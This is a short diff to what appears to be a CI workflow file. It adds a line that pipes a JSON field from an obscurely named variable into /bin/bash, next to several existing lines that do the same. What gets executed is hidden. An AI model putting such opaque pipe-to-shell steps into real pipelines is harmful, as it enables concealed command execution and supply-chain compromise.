@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$bbp7" | jq -r .n00 | /bin/bash
           echo $jgxcf5 | jq -r .bfvo78 | /bin/bash
           printf '%s' "$bid96" | jq -r .jij227 | /bin/bash
+          printf '%s' "$p79920" | jq -r .smk9 | /bin/bash
 
       - name: Persist results
         if: always()
